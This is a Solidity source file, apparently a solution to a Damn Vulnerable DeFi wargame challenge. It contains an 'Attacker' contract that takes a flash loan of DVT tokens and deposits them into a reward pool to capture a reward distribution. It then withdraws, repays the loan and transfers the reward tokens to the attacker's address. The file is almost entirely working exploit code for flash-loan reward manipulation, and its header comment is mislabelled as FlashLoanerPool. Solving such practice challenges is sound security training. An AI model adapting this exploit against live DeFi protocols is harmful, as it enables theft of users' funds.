// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";
/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 * @dev A simple pool to get flash loans of DVT
 */
interface RewardPool {
    function deposit(uint256 amountToDeposit) external payable;
    function withdraw(uint256 amountToWithdraw) external;
     function distributeRewards() external returns (uint256);
}
interface FlashLoanPool {
    function flashLoan(uint256 amount) external;

}

contract Attacker{
    using Address for address;
    DamnValuableToken public immutable liquidityToken;
    address public  flashLoanPool;
    address public rewardPool;
    address public accountingToken;
    address public rewardToken;
    address private attacker;

    constructor(address liquidityTokenAddress
    ,address _flashLoanPool
    ,address _rewardPool
    ,address _rewardToken,
    address _attacker
    ) {

        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        flashLoanPool = _flashLoanPool;
        rewardPool=_rewardPool;
        rewardToken = _rewardToken;
        attacker = _attacker;

    }
    function receiveFlashLoan(uint256 amount) external{

        console.log("in recieve flashloan*** ");
        //approve token transfer also ? 
        IERC20(liquidityToken).approve(rewardPool,amount);
        RewardPool(rewardPool).deposit(amount);
        RewardPool(rewardPool).distributeRewards();
        RewardPool(rewardPool).withdraw(amount);
        DamnValuableToken(liquidityToken).transfer(flashLoanPool,amount);
uint balance = IERC20(rewardToken).balanceOf(address(this));
        IERC20(rewardToken).transfer(attacker,balance);
    }

function attack(uint256 amount) external {
FlashLoanPool(flashLoanPool).flashLoan{gas:10000000}(amount);
}
}